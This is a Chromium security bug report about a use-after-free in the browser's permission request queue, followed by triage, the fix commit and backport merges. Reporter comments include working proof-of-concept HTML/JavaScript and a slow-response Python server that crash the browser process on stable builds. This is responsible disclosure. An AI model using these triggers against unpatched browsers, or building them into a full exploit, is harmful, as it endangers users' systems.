# UAF in permissions::PermissionRequest::request_type

| Field | Value |
|-------|-------|
| **Issue ID** | [40063055](https://issues.chromium.org/issues/40063055) |
| **Status** | New |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | UI>Browser>Permissions>Prompts |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ha...@gmail.com |
| **Assignee** | tu...@chromium.org |
| **Created** | 2023-02-13 |
| **Bounty** | $41,000.00 |

## Description

**Steps to reproduce the problem:**  

1.python ./copy\_mojo\_js\_bindings.py /path/to/chrome/.../out/Asan/gen  

2.python SimpleHTTPServer  

3.Run chromium with the html file.

**Problem Description:**  

There's a circular\_deque[1] in pending\_permission\_requests\_ which hold a raw point of PermissionRequest. And the function ValidateRequest[2][3][4] called in PermissionRequestManager::DequeueRequestIfNeeded may delete the PermissionRequest object and return false.  

However, we can see in [2][3]. It will pop the deleted PermissionRequest from pending\_permission\_requests\_'s circular\_deque. In [4]. It leaves a dangling pointer in pending\_permission\_requests\_'s circular\_deque if ValidateRequest delete the PermissionRequest object. Which caused a UAF when the dangling pointer use in permissions::PermissionRequest::request\_type.

void PermissionRequestManager::DequeueRequestIfNeeded() {  

...  

while (!pending\_permission\_requests\_.IsEmpty()) {  

auto\* next = pending\_permission\_requests\_.Pop();  

if (ValidateRequest(next)) { ---------------------[2]  

validated\_requests\_set\_.insert(next);  

requests\_.push\_back(next);  

break;  

}  

}

if (requests\_.empty()) {  

return;  

}

// Find additional requests that can be grouped with the first one.  

for (; !pending\_permission\_requests\_.IsEmpty();  

pending\_permission\_requests\_.Pop()) {  

auto\* front = pending\_permission\_requests\_.Peek();  

if (!ValidateRequest(front)) -----------------------[3]  

continue;

```
validated_requests_set_.insert(front);  
if (!ShouldGroupRequests(requests_.front(), front))  
  break;  

requests_.push_back(front);  

```

}

// Mark the remaining pending requests as validated, so only the "new and has  

// not been validated" requests added to the queue could have effect to  

// priority order  

for (auto\* request : pending\_permission\_requests\_) {  

if (ValidateRequest(request))  

validated\_requests\_set\_.insert(request); ------------------------[4]  

}  

...  

}  

[1]<https://source.chromium.org/chromium/chromium/src/+/main:components/permissions/permission_request_queue.h;l=54;drc=8ce391bed5ee336e59ccd87b8869760c30e2aad7;bpv=0;bpt=1>

**Additional Comments:**  

Bisect information: This bug was introduced in <https://source.chromium.org/chromium/chromium/src/+/5bd9b87658ea5ca9ffdae2239938cbbc555eff28>. And I find this bug impact the stable version chrome.

\*\*Chrome version: \*\* 109.0.0.0 \*\*Channel: \*\* Stable

**OS:** Linux

## Attachments

- [asan.log](attachments/asan.log) (text/plain, 38.8 KB)
- [copy_mojo_js_bindings.py](attachments/copy_mojo_js_bindings.py) (text/plain, 512 B)
- [poc.html](attachments/poc.html) (text/plain, 2.7 KB)
- [poc.html](attachments/poc.html) (text/plain, 2.9 KB)
- [asan.log](attachments/asan.log) (text/plain, 26.1 KB)
- [poc2.html](attachments/poc2.html) (text/plain, 1.9 KB)
- [poc2.html](attachments/poc2.html) (text/plain, 1.9 KB)
- [asan.log](attachments/asan.log) (text/plain, 26.1 KB)

## Timeline

### [Deleted User] (2023-02-13)

[Empty comment from Monorail migration]

### ha...@gmail.com (2023-02-13)

[Comment Deleted]

### ha...@gmail.com (2023-02-13)

The true steps 1 is python ./copy_mojo_js_bindings.py /path/to/chrome/.../out/Asan/

### ha...@gmail.com (2023-02-14)

Here is the poc. I used flag --enable-blink-features=MojoJS to simulate a compromised renderer. In theory. Since this code can be reached through dom api without enable mojojs so this bug don't need a compromised renderer. But I failed to structure the poc without compromised renderer because it's hard to win the race.

***full bisect information***
This bug was introduced in https://source.chromium.org/chromium/chromium/src/+/5bd9b87658ea5ca9ffdae2239938cbbc555eff28. And impact the stable version from M109(109.0.5414.74) to now.

Steps to reproduce the problem:
1.python ./copy_mojo_js_bindings.py /path/to/chrome/.../out/Asan/
2.python SimpleHTTPServer
3.rm -rf /tmp/abcd1234; ./chrome --enable-blink-features=MojoJS --user-data-dir=/tmp/abcd1234 http://localhost:8000/poc.html
4.Browser process crash

### cl...@chromium.org (2023-02-14)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6574479068299264.

### th...@chromium.org (2023-02-14)

For now, I have not been able to reproduce this on trunk. Trying out ClusterFuzz.

### th...@chromium.org (2023-02-14)

Still not able to reproduce, and it doesn't look like there's been any luck with ClusterFuzz. Can you check that there is nothing else necessary in the repro steps?

### ha...@gmail.com (2023-02-15)

Hello. I’m sorry to hear this. I can reproduce it stablely in my computer. I think the key reason to reproduce this bug is:
1.Make sure you use the flag --enable-blink-features=MojoJS  and make sure the mojojs file has been visit successfully
.
2.Once you fail. You should close the browser and use rm -rf to delete the user-data-dir.(This could also be down by change the website’s origin.). And change the number 110 in poc.html from 40-300.
setTimeout(function () {
      iframe[0].remove();
    }, 110);

### ha...@gmail.com (2023-02-15)

Because this bug is caused by race. We need alloc multiple rfh and request permission synchronously. Then remove one rfh before the permissionrequestmanager::DequeueRequestIfNeeded function run.

### ha...@gmail.com (2023-02-15)

Sorry. I test the poc in my windows laptop stable version chrome and I find I can't reproduce it until i set the timeout to 10.
I update a new poc now I test 3 computers and all of them could reproduce stablely in stable version chrome(asan version is also ok).
Here is a log in this use after free path which could cause arbitrary function call.

Steps to reproduce the problem:
1.python ./copy_mojo_js_bindings.py /path/to/chrome/.../out/Asan  (make sure you see a folder named "gen" create)
2.python SimpleHTTPServer
3.rm -rf /tmp/abcd1234; ./chrome --enable-blink-features=MojoJS --user-data-dir=/tmp/abcd1234 http://localhost:8000/poc.html
4.Browser process crash

### ha...@gmail.com (2023-02-15)

And I also deploy a poc which could trigger with bug without compromised renderer. The success rate is too low(I only success twice). But I think it can be furture optimization and can demonstrate this bug can be triggered with dom api and without compromised renderer.

Steps to reproduce the problem:
1.python SimpleHTTPServer
2.rm -rf /tmp/abcd1234; ./chrome --enable-blink-features=--enable-blink-features=PermissionsRequestRevoke --user-data-dir=/tmp/abcd1234 http://localhost:8000/poc2.html  (PermissionsRequestRevoke features is enabled by default in stable version chrome. This flag is just to use navigator.permissions.request dom api)
3.Browser process crash

### ha...@gmail.com (2023-02-15)

And I also deploy a poc which could trigger this bug without compromised renderer. The success rate is too low(I only success twice). But I think it can be furture optimization and can demonstrate this bug can be triggered with dom api and without compromised renderer.

Steps to reproduce the problem:
1.python SimpleHTTPServer
2.rm -rf /tmp/abcd1234; ./chrome  -enable-blink-features=PermissionsRequestRevoke --user-data-dir=/tmp/abcd1234 http://localhost:8000/poc2.html  (PermissionsRequestRevoke features is enabled by default in stable version chrome. This flag is just to use navigator.permissions.request dom api)
3.Browser process crash

### cl...@chromium.org (2023-02-15)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5958500193861632.

### cl...@chromium.org (2023-02-15)

ClusterFuzz testcase 5958500193861632 is closed as invalid, so closing issue.

### cl...@chromium.org (2023-02-15)

Testcase 5958500193861632 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5958500193861632.

### th...@chromium.org (2023-02-15)

[Empty comment from Monorail migration]

### ha...@gmail.com (2023-02-15)

Hello，could you test it in your linux computer follow the https://crbug.com/chromium/1415366#c10. I can stablely reproduce.

### th...@chromium.org (2023-02-15)

re https://crbug.com/chromium/1415366#c10: Unfortunately I still cannot reproduce. My setup is on Linux and is as follows.

gn args:
is_asan = true
is_debug = false
use_goma=true

I'm navigated to directory out/Default. This contains poc.html + mojo_bindings.js + the gen folder. The poc.html file is the one from https://crbug.com/chromium/1415366#c10.

Run commands in two separate terminals, both at out/Default:
>> python3 -m http.server 8000
>> rm -rf /tmp/abcd1234; ./chrome --enable-blink-features=MojoJS --user-data-dir=/tmp/abcd1234 http://localhost:8000/poc.html

The local server is showing all 200s and 304s other than the favicon 404. I have tried both 1) not clicking anything on the site itself, as well as 2) accepting all the permissions prompts. I have left the site open for about 1-2 minutes.

Is there anything I am doing that you think I should change?

### th...@chromium.org (2023-02-15)

Oh, forgot to mention: I have checked out commit 130f3e4d850f4bc7387cfb8d08aa993d288a67a9 corresponding to M110 (Stable).

### ha...@gmail.com (2023-02-15)

I’m sorry for this trouble. but I don’t know why. Maybe you can reproduce it in the windows 10 system’s stable version chrome just with  --enable-blink-features=MojoJS and a local host server(remote http server’s request be blocked so local server or https server is needed)? In my test it will crash immediatly.

### ha...@gmail.com (2023-02-16)

Hello, I promise this is the final poc. I deep analysis the bug and find a way trigger it without race and don't need a compromised renderer.

Steps to reproduce the bug:
1. python3 server.py
2. rm -rf /tmp/abcd1234;out/asan/chrome --enable-blink-features=PermissionsRequestRevoke  --user-data-dir=/tmp/abcd1234 http://localhost:8000/poc3.html
(Note the blink feature PermissionsRequestRevoke is enabled by default in the stable version chrome only to use permission.request api)

I also delete previous poc for not causing misunderstanding.

***This is a browser uaf without compromised renderer***

***full bisect information***

This bug was introduced in https://source.chromium.org/chromium/chromium/src/+/5bd9b87658ea5ca9ffdae2239938cbbc555eff28. And impact the stable version from M109(109.0.5414.74) to now.

poc3.html
```
<html>
<body>
<script>
    var idx = 0;
    function alloc_rfh(src) {
        iframe[idx].src = src;
        document.body.appendChild(iframe[idx++]);
    }
    if(window.location.search.substring()=="") {
        var iframe = new Array(5);
        for (var i = 0; i < 5; i++) {
            iframe[i] = document.createElement("iframe");
            alloc_rfh("?child");
        }
        setTimeout(() => {
            var iframe_ptr = new Array(5);
            for (var i = 0; i < 5; i++) {
                iframe_ptr[i] = iframe[i].contentWindow.navigator.permissions;
            }
            iframe_ptr[0].request({name: "clipboard-write"});
            iframe_ptr[2].request({name: "notifications"});
            iframe_ptr[0].request({name: "clipboard-read"});
            iframe_ptr[1].request({name: "geolocation"});
            iframe_ptr[1].request({name: "clipboard-read"});
            iframe_ptr[3].request({name: "notifications"});
            iframe_ptr[3].request({name: "geolocation"});
            iframe_ptr[4].request({name: "microphone"});
            iframe[1].remove();
            setTimeout( ()=>{
                window.location.reload();
            },5000);
        }, 1000);
    }
</script>
<script src="?slow_request"></script>
</body>
</html>
```

server.py
```
from http.server import HTTPServer, SimpleHTTPRequestHandler
from time import sleep

HOST_ADDRESS = "127.0.0.1"
HOST_PORT = 8000

class RequestHandler(SimpleHTTPRequestHandler): 
  def do_GET(self):
    if "slow_request" in self.path:
        sleep(5)
    SimpleHTTPRequestHandler.do_GET(self)

server_address = (HOST_ADDRESS, HOST_PORT)
httpd = HTTPServer(server_address, RequestHandler)
httpd.serve_forever()
```

### th...@chromium.org (2023-02-16)

Thanks for the updated POC! I can reproduce this on M110 (current stable). Assigning to tungnh@ per the suspected culprit CL listed above.

Setting critical severity due to UAF in the browser process not requiring user interaction / compromised renderer.

[Monorail components: UI>Browser>Permissions>Prompts]

### th...@chromium.org (2023-02-16)

Actually I'm going to double check on the severity due to the PermissionsRequestRevoke arg. Will comment again in a bit.

### [Deleted User] (2023-02-16)

[Empty comment from Monorail migration]

### th...@chromium.org (2023-02-16)

For now I'm setting Security_Impact-None due to the required flag. hasakichase@ or tungnh@ -- could you comment on whether the flag is required, or if this can be reproduced by default in some chrome configuration?

### [Deleted User] (2023-02-16)

[Empty comment from Monorail migration]

### ha...@gmail.com (2023-02-16)

Hello， thanks fo the check. You can visit a https website in stable and you will find navigator.permission.request api is on.（Thus mentioned this bug impact the stable）

### ha...@gmail.com (2023-02-16)

Hello, thanks fo the check. You can visit a https website in stable and you will find navigator.permissions.request api is on.（Thus mentioned this feature is enabled by default and this bug impact the stable）

### ha...@gmail.com (2023-02-16)

it’s enabled by default in chrome’s https website not chromium’s.

### tu...@chromium.org (2023-02-17)

Afaik, the navigator.permissions.request was disable by default.
The first look, presumedly the dangling pointer was there for a while, but changing the prioritising mechanism make it exposable.
I will take a look at this shortly.

### ha...@gmail.com (2023-02-17)

Sorry. I found I enabled experimental web platform feature in my self-use chrome. This make me misunderstand it. It's true that this feature is disabled by default.

I find other dom api which can be used to bypass this feature flag and now we don't need navigator.permissions.request api and the feature flag.

Steps to reproduce the bug:
1. python3 server.py
2. rm -rf /tmp/abcd1234;out/asan/chrome  --user-data-dir=/tmp/abcd1234 http://localhost:8000/poc3.html

***full bisect information***

This bug was introduced in https://source.chromium.org/chromium/chromium/src/+/5bd9b87658ea5ca9ffdae2239938cbbc555eff28. And impact the stable version from M109(109.0.5414.74) to now.

poc3.html
```
<html>
<body>
<script>
    var idx = 0;
    function alloc_rfh(src) {
        iframe[idx].src = src;
        document.body.appendChild(iframe[idx++]);
    }
    if(window.location.search.substring()=="") {
        var iframe = new Array(5);
        for (var i = 0; i < 5; i++) {
            iframe[i] = document.createElement("iframe");
            alloc_rfh("?child");
        }
        setTimeout(() => {
            var iframe_ptr = new Array(4);
            for (var i = 0; i < 4; i++) {
                iframe_ptr[i] = iframe[i].contentWindow;
            }
            iframe_ptr[0].navigator.geolocation.getCurrentPosition(console.log,console.error);
            iframe_ptr[1].Notification.requestPermission();
            iframe_ptr[2].Notification.requestPermission();
            iframe_ptr[3].focus();
            iframe_ptr[3].navigator.clipboard.readText();

            iframe[0].remove();
            setTimeout( ()=>{
                window.location.reload();
            },5000);
        }, 1000);
    }
</script>
<script src="?slow_request"></script>
</body>
</html>
</script>
<script src="?slow_request"></script>
</body>
</html>
```

server.py is in https://crbug.com/chromium/1415366#c21.


### th...@chromium.org (2023-02-17)

Thanks! With that POC, I can reproduce on stable (M110) without the extra flag. Removing the Security_Impact-None label.

### [Deleted User] (2023-02-17)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-02-17)

Setting Pri-0 to match security severity Critical. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### tu...@chromium.org (2023-02-20)

[Empty comment from Monorail migration]

### tu...@chromium.org (2023-02-20)

[Empty comment from Monorail migration]

### tu...@chromium.org (2023-02-20)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-02-20)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/dd597022c93047e88f6ddb812eb04ed392222b33

commit dd597022c93047e88f6ddb812eb04ed392222b33
Author: Thomas Nguyen <tungnh@google.com>
Date: Mon Feb 20 13:49:28 2023

Skip finalizing permission requests in pending queue

Bug: 1415366

Change-Id: I2bd464a202354d9941bed8498bd44b5c5ebea6de
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4271191
Commit-Queue: Thomas Nguyen <tungnh@chromium.org>
Reviewed-by: Andy Paicu <andypaicu@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1107426}

[modify] https://crrev.com/dd597022c93047e88f6ddb812eb04ed392222b33/components/permissions/permission_request_manager.cc
[modify] https://crrev.com/dd597022c93047e88f6ddb812eb04ed392222b33/components/permissions/permission_request_manager.h


### en...@chromium.org (2023-02-20)

Marking it as Fixed to pass it over to Sheriffbot for kicking off merge requests and for label assignments.

### [Deleted User] (2023-02-20)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-20)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-20)

Requesting merge to stable M110 because latest trunk commit (1107426) appears to be after stable branch point (1084008).

Requesting merge to beta M111 because latest trunk commit (1107426) appears to be after beta branch point (1097615).

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been tested on Canary?
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### tu...@chromium.org (2023-02-21)

1. Which CLs should be backmerged? (Please include Gerrit links.)
https://chromium-review.googlesource.com/c/chromium/src/+/4271191
2. Has this fix been tested on Canary?
Not yet, we might need someone to verify it.
3. Has this fix been verified to not pose any stability regressions and does it pose potential stability risks?
Not yet, we might need someone to verify it
4. Does this fix pose any known compatibility risks?
No
5. Does it require manual verification by the test team? If so, please describe required testing.
- Build Chrome asan with following args
is_asan = true
is_debug = false
use_goma=true
- Follow the test steps in https://crbug.com/chromium/1415366#c31


### en...@chromium.org (2023-02-21)

CC'ing release owners. Any chance we can squeeze this in for the M110 respin that is scheduled for today?

### da...@google.com (2023-02-21)

CC'ing @pbommana release owner for M111

### [Deleted User] (2023-02-21)

Merge review required: M111 is already shipping to beta.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: harrysouders (Android), harrysouders (iOS), dgagnon (ChromeOS), pbommana (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-02-21)

Merge review required: M110 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:
1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: govind (Android), harrysouders (iOS), ceb (ChromeOS), danielyip (Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### tu...@chromium.org (2023-02-21)

1. Why does your merge fit within the merge criteria for these milestones?
- Chrome Browser: https://chromiumdash.appspot.com/branches
This CL changes a corner case of finalising pending queue, but does not change the logic

2. What changes specifically would you like to merge? Please link to Gerrit.
https://chromium-review.googlesource.com/c/chromium/src/+/4272860
https://chromium-review.googlesource.com/c/chromium/src/+/4274632

3. Have the changes been released and tested on canary?
Release but not verified from release team (I verified myself before landing)

4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
No

5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? https://goto.google.com/cros-engprodcomponents
N/A

6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.
It's fixing a critical issue. need verify following https://crbug.com/chromium/1415366#c43

### tu...@chromium.org (2023-02-21)

Just FYI, I was be able to verify, following https://crbug.com/chromium/1415366#c43
- Crash 5/5 on stable version 110.0.5481.100
- Crash 0/5 on canary (where the fix was landed), Chrome version: 112.0.5609.0


### ad...@google.com (2023-02-21)

Approving merge to M111 and M110.

### gi...@appspot.gserviceaccount.com (2023-02-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/5de14e18c2cd32700cef587c7f94579fe31aa769

commit 5de14e18c2cd32700cef587c7f94579fe31aa769
Author: Thomas Nguyen <tungnh@google.com>
Date: Tue Feb 21 16:00:02 2023

Skip finalizing permission requests in pending queue

Bug: 1415366

(cherry picked from commit dd597022c93047e88f6ddb812eb04ed392222b33)

Change-Id: I2bd464a202354d9941bed8498bd44b5c5ebea6de
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4271191
Commit-Queue: Thomas Nguyen <tungnh@chromium.org>
Reviewed-by: Andy Paicu <andypaicu@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1107426}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4272860
Reviewed-by: Balazs Engedy <engedy@chromium.org>
Reviewed-by: Daniel Yip <danielyip@google.com>
Owners-Override: Daniel Yip <danielyip@google.com>
Commit-Queue: Krishna Govind <govind@chromium.org>
Cr-Commit-Position: refs/branch-heads/5481@{#1236}
Cr-Branched-From: 130f3e4d850f4bc7387cfb8d08aa993d288a67a9-refs/heads/main@{#1084008}

[modify] https://crrev.com/5de14e18c2cd32700cef587c7f94579fe31aa769/components/permissions/permission_request_manager.cc
[modify] https://crrev.com/5de14e18c2cd32700cef587c7f94579fe31aa769/components/permissions/permission_request_manager.h


### gi...@appspot.gserviceaccount.com (2023-02-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/43d94c6bea6b0124e8831a1b986378c89945bf98

commit 43d94c6bea6b0124e8831a1b986378c89945bf98
Author: Thomas Nguyen <tungnh@google.com>
Date: Tue Feb 21 16:04:38 2023

Skip finalizing permission requests in pending queue

Bug: 1415366

(cherry picked from commit dd597022c93047e88f6ddb812eb04ed392222b33)

(cherry picked from commit 5de14e18c2cd32700cef587c7f94579fe31aa769)

Change-Id: I2bd464a202354d9941bed8498bd44b5c5ebea6de
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4271191
Commit-Queue: Thomas Nguyen <tungnh@chromium.org>
Reviewed-by: Andy Paicu <andypaicu@chromium.org>
Cr-Original-Original-Commit-Position: refs/heads/main@{#1107426}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4272860
Reviewed-by: Balazs Engedy <engedy@chromium.org>
Reviewed-by: Daniel Yip <danielyip@google.com>
Owners-Override: Daniel Yip <danielyip@google.com>
Commit-Queue: Krishna Govind <govind@chromium.org>
Cr-Original-Commit-Position: refs/branch-heads/5481@{#1236}
Cr-Original-Branched-From: 130f3e4d850f4bc7387cfb8d08aa993d288a67a9-refs/heads/main@{#1084008}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4274892
Auto-Submit: Daniel Yip <danielyip@google.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5481_132@{#2}
Cr-Branched-From: 00005388c2fd9d34379d282af2c23ced583036ba-refs/branch-heads/5481@{#1222}
Cr-Branched-From: 130f3e4d850f4bc7387cfb8d08aa993d288a67a9-refs/heads/main@{#1084008}

[modify] https://crrev.com/43d94c6bea6b0124e8831a1b986378c89945bf98/components/permissions/permission_request_manager.cc
[modify] https://crrev.com/43d94c6bea6b0124e8831a1b986378c89945bf98/components/permissions/permission_request_manager.h


### [Deleted User] (2023-02-21)

LTS Milestone M108

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### am...@chromium.org (2023-02-21)

[Empty comment from Monorail migration]

### am...@google.com (2023-02-21)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-02-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/003ac7640c5bc6b946d7cc003cd0dd12fb22c91b

commit 003ac7640c5bc6b946d7cc003cd0dd12fb22c91b
Author: Thomas Nguyen <tungnh@google.com>
Date: Tue Feb 21 16:20:14 2023

Skip finalizing permission requests in pending queue

Bug: 1415366

(cherry picked from commit dd597022c93047e88f6ddb812eb04ed392222b33)

Change-Id: I2bd464a202354d9941bed8498bd44b5c5ebea6de
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4271191
Commit-Queue: Thomas Nguyen <tungnh@chromium.org>
Reviewed-by: Andy Paicu <andypaicu@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1107426}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4274632
Owners-Override: Daniel Yip <danielyip@google.com>
Reviewed-by: Daniel Yip <danielyip@google.com>
Commit-Queue: Krishna Govind <govind@chromium.org>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5563@{#680}
Cr-Branched-From: 3ac59a6729cdb287a7ee629a0004c907ec1b06dc-refs/heads/main@{#1097615}

[modify] https://crrev.com/003ac7640c5bc6b946d7cc003cd0dd12fb22c91b/components/permissions/permission_request_manager.cc
[modify] https://crrev.com/003ac7640c5bc6b946d7cc003cd0dd12fb22c91b/components/permissions/permission_request_manager.h


### gi...@appspot.gserviceaccount.com (2023-02-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/f0d9b05fb10991e2841e742f7c7f85fe1588f5ce

commit f0d9b05fb10991e2841e742f7c7f85fe1588f5ce
Author: Thomas Nguyen <tungnh@google.com>
Date: Tue Feb 21 16:36:58 2023

Skip finalizing permission requests in pending queue

Bug: 1415366

(cherry picked from commit dd597022c93047e88f6ddb812eb04ed392222b33)

(cherry picked from commit 5de14e18c2cd32700cef587c7f94579fe31aa769)

Change-Id: I2bd464a202354d9941bed8498bd44b5c5ebea6de
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4271191
Commit-Queue: Thomas Nguyen <tungnh@chromium.org>
Reviewed-by: Andy Paicu <andypaicu@chromium.org>
Cr-Original-Original-Commit-Position: refs/heads/main@{#1107426}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4272860
Reviewed-by: Balazs Engedy <engedy@chromium.org>
Reviewed-by: Daniel Yip <danielyip@google.com>
Owners-Override: Daniel Yip <danielyip@google.com>
Commit-Queue: Krishna Govind <govind@chromium.org>
Cr-Original-Commit-Position: refs/branch-heads/5481@{#1236}
Cr-Original-Branched-From: 130f3e4d850f4bc7387cfb8d08aa993d288a67a9-refs/heads/main@{#1084008}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4273872
Reviewed-by: Krishna Govind <govind@chromium.org>
Owners-Override: Krishna Govind <govind@chromium.org>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/5481_123@{#2}
Cr-Branched-From: 62e2ed1909160aeca0004861a7115be56988408b-refs/branch-heads/5481@{#1191}
Cr-Branched-From: 130f3e4d850f4bc7387cfb8d08aa993d288a67a9-refs/heads/main@{#1084008}

[modify] https://crrev.com/f0d9b05fb10991e2841e742f7c7f85fe1588f5ce/components/permissions/permission_request_manager.cc
[modify] https://crrev.com/f0d9b05fb10991e2841e742f7c7f85fe1588f5ce/components/permissions/permission_request_manager.h


### ha...@gmail.com (2023-02-21)

[Comment Deleted]

### ad...@google.com (2023-02-21)

[Empty comment from Monorail migration]

### ad...@google.com (2023-02-21)

M109 Windows 2012 support channel situation:
This is already marked as applying to M109, so we need to backport to M109 and make an M109 refresh. Adding M109 merge request for consideration.
I'd like someone else to approve that merge request rather than self-approve.

### pg...@google.com (2023-02-21)

The introducing CL was identified in https://crbug.com/chromium/1415366#c4 to have landed in the M109 release 
Merge approved for M109!

### gi...@appspot.gserviceaccount.com (2023-02-21)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/2bd849cc947cff0607666fd9225f0f552f3c6f8b

commit 2bd849cc947cff0607666fd9225f0f552f3c6f8b
Author: Thomas Nguyen <tungnh@google.com>
Date: Tue Feb 21 21:26:24 2023

Skip finalizing permission requests in pending queue

Bug: 1415366

(cherry picked from commit dd597022c93047e88f6ddb812eb04ed392222b33)

Change-Id: I2bd464a202354d9941bed8498bd44b5c5ebea6de
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4271191
Commit-Queue: Thomas Nguyen <tungnh@chromium.org>
Reviewed-by: Andy Paicu <andypaicu@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1107426}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4277341
Commit-Queue: Srinivas Sista <srinivassista@chromium.org>
Owners-Override: Srinivas Sista <srinivassista@chromium.org>
Reviewed-by: Srinivas Sista <srinivassista@chromium.org>
Reviewed-by: Balazs Engedy <engedy@chromium.org>
Cr-Commit-Position: refs/branch-heads/5414@{#1524}
Cr-Branched-From: 4417ee59d7bf6df7a9c9ea28f7722d2ee6203413-refs/heads/main@{#1070088}

[modify] https://crrev.com/2bd849cc947cff0607666fd9225f0f552f3c6f8b/components/permissions/permission_request_manager.cc
[modify] https://crrev.com/2bd849cc947cff0607666fd9225f0f552f3c6f8b/components/permissions/permission_request_manager.h


### tu...@chromium.org (2023-02-22)

I just want to double check if we have to merge to 108 LTS version?

### en...@chromium.org (2023-02-22)

Good catch. The original report mentioned M109, but I just double-checked, the culprit CL actually landed in 108.0.5358.0. So we need to merge it to M108-LTS.

### vo...@google.com (2023-02-22)

Doesn't impact M102. Seems like the commit identified in https://crbug.com/chromium/1415366#c31 is actually present in M108 (https://chromiumdash.appspot.com/commit/5bd9b87658ea5ca9ffdae2239938cbbc555eff28) so I'm going to cherry-pick the fix to M108.

### vo...@google.com (2023-02-22)

[Empty comment from Monorail migration]

### [Deleted User] (2023-02-22)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

